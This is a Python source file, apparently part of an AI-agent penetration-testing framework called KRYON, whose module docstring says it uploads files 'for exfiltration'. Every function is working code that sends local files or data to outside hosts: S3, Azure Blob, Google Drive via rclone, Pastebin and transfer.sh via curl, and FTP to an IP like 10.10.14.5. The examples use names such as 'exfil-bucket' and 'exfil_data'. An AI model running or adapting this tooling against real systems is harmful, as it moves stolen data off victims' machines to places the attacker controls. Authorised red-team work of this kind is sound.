"""
KRYON Cloud Upload Module
===========================

Upload files to cloud services for exfiltration.

Primary Users:
- Pentest Agent (Alpha-Red)
- Forensic Analyzer (Alpha-Platinum)
"""

from typing import Any, Optional

from kryon.tools.common import generic_linux_command


def upload_to_s3(
    file_path: str,
    bucket_name: str,
    object_key: str,
    aws_access_key: Optional[str] = None,
    aws_secret_key: Optional[str] = None,
    region: str = "us-east-1",
) -> dict[str, Any]:
    """
    Upload file to AWS S3.

    Args:
        file_path: Path to file
        bucket_name: S3 bucket name
        object_key: S3 object key (file name in bucket)
        aws_access_key: AWS access key
        aws_secret_key: AWS secret key
        region: AWS region

    Returns:
        Dictionary with upload result

    Example:
        >>> result = upload_to_s3(
        ...     file_path="/tmp/data.enc",
        ...     bucket_name="exfil-bucket",
        ...     object_key="data.enc"
        ... )
    """
    result = {"success": False, "url": "", "error": None}

    try:
        # Build AWS CLI command
        cmd_parts = ["aws", "s3", "cp", file_path, f"s3://{bucket_name}/{object_key}"]

        if region:
            cmd_parts.extend(["--region", region])

        # Set credentials if provided
        env_vars = {}
        if aws_access_key:
            env_vars["AWS_ACCESS_KEY_ID"] = aws_access_key
        if aws_secret_key:
            env_vars["AWS_SECRET_ACCESS_KEY"] = aws_secret_key

        cmd_result = generic_linux_command(cmd_parts[0], " ".join(cmd_parts[1:]))

        if cmd_result.get("success"):
            result["success"] = True
            result["url"] = f"s3://{bucket_name}/{object_key}"
        else:
            result["error"] = cmd_result.get("error", "S3 upload failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def upload_to_azure(
    file_path: str,
    container_name: str,
    blob_name: str,
    connection_string: Optional[str] = None,
) -> dict[str, Any]:
    """
    Upload file to Azure Blob Storage.

    Args:
        file_path: Path to file
        container_name: Azure container name
        blob_name: Blob name
        connection_string: Azure connection string

    Returns:
        Dictionary with upload result

    Example:
        >>> result = upload_to_azure(
        ...     file_path="/tmp/data.enc",
        ...     container_name="exfil-container",
        ...     blob_name="data.enc"
        ... )
    """
    result = {"success": False, "url": "", "error": None}

    try:
        cmd_parts = ["az", "storage", "blob", "upload"]
        cmd_parts.extend(["--file", file_path])
        cmd_parts.extend(["--container-name", container_name])
        cmd_parts.extend(["--name", blob_name])

        if connection_string:
            cmd_parts.extend(["--connection-string", connection_string])

        cmd_result = generic_linux_command(cmd_parts[0], " ".join(cmd_parts[1:]))

        if cmd_result.get("success"):
            result["success"] = True
            result["url"] = f"azure://{container_name}/{blob_name}"
        else:
            result["error"] = cmd_result.get("error", "Azure upload failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def upload_to_gdrive(
    file_path: str,
    folder_id: Optional[str] = None,
) -> dict[str, Any]:
    """
    Upload file to Google Drive using rclone.

    Args:
        file_path: Path to file
        folder_id: Google Drive folder ID

    Returns:
        Dictionary with upload result

    Example:
        >>> result = upload_to_gdrive("/tmp/data.enc")
    """
    result = {"success": False, "url": "", "error": None}

    try:
        # Use rclone for Google Drive
        if folder_id:
            dest = f"gdrive:{folder_id}/"
        else:
            dest = "gdrive:"

        cmd_result = generic_linux_command("rclone", f"copy {file_path} {dest}")

        if cmd_result.get("success"):
            result["success"] = True
            result["url"] = f"gdrive://{folder_id or 'root'}"
        else:
            result["error"] = cmd_result.get("error", "Google Drive upload failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def upload_via_pastebin(
    data: str,
    api_key: Optional[str] = None,
    paste_name: Optional[str] = None,
    private: bool = True,
) -> dict[str, Any]:
    """
    Upload data to Pastebin for exfiltration.

    Args:
        data: Data to upload
        api_key: Pastebin API key
        paste_name: Name of paste
        private: Make paste private

    Returns:
        Dictionary with upload result and paste URL

    Example:
        >>> result = upload_via_pastebin(
        ...     data="sensitive data",
        ...     paste_name="exfil_data"
        ... )
    """
    result = {"success": False, "url": "", "error": None}

    try:
        # Use curl to post to pastebin
        privacy = "1" if private else "0"

        cmd_parts = ["curl", "-X", "POST"]
        cmd_parts.extend(["-d", f"api_paste_code={data}"])

        if api_key:
            cmd_parts.extend(["-d", f"api_dev_key={api_key}"])
        if paste_name:
            cmd_parts.extend(["-d", f"api_paste_name={paste_name}"])

        cmd_parts.extend(["-d", f"api_paste_private={privacy}"])
        cmd_parts.append("https://pastebin.com/api/api_post.php")

        cmd_result = generic_linux_command(cmd_parts[0], " ".join(cmd_parts[1:]))

        if cmd_result.get("success"):
            output = cmd_result.get("output", "").strip()
            if output.startswith("http"):
                result["success"] = True
                result["url"] = output
            else:
                result["error"] = f"Pastebin error: {output}"
        else:
            result["error"] = cmd_result.get("error", "Pastebin upload failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def upload_via_transfer_sh(file_path: str) -> dict[str, Any]:
    """
    Upload file to transfer.sh for quick exfiltration.

    Args:
        file_path: Path to file

    Returns:
        Dictionary with upload result and download URL

    Example:
        >>> result = upload_via_transfer_sh("/tmp/data.enc")
    """
    result = {"success": False, "url": "", "error": None}

    try:
        import os

        filename = os.path.basename(file_path)

        cmd_result = generic_linux_command("curl", f"--upload-file {file_path} https://transfer.sh/{filename}")

        if cmd_result.get("success"):
            url = cmd_result.get("output", "").strip()
            result["success"] = True
            result["url"] = url
        else:
            result["error"] = cmd_result.get("error", "transfer.sh upload failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def upload_via_ftp(
    file_path: str,
    ftp_host: str,
    ftp_user: str,
    ftp_password: str,
    remote_path: Optional[str] = None,
    port: int = 21,
) -> dict[str, Any]:
    """
    Upload file via FTP.

    Args:
        file_path: Path to file
        ftp_host: FTP server host
        ftp_user: FTP username
        ftp_password: FTP password
        remote_path: Remote file path
        port: FTP port

    Returns:
        Dictionary with upload result

    Example:
        >>> result = upload_via_ftp(
        ...     file_path="/tmp/data.enc",
        ...     ftp_host="10.10.14.5",
        ...     ftp_user="ftpuser",
        ...     ftp_password="ftppass"
        ... )
    """
    result = {"success": False, "error": None}

    try:
        import os

        filename = os.path.basename(file_path)

        if not remote_path:
            remote_path = filename

        # Use curl for FTP upload
        cmd_result = generic_linux_command(
            "curl",
            f"-T {file_path} ftp://{ftp_host}:{port}/{remote_path} --user {ftp_user}:{ftp_password}",
        )

        if cmd_result.get("success"):
            result["success"] = True
            result["url"] = f"ftp://{ftp_host}:{port}/{remote_path}"
        else:
            result["error"] = cmd_result.get("error", "FTP upload failed")

    except Exception as e:
        result["error"] = str(e)

    return result
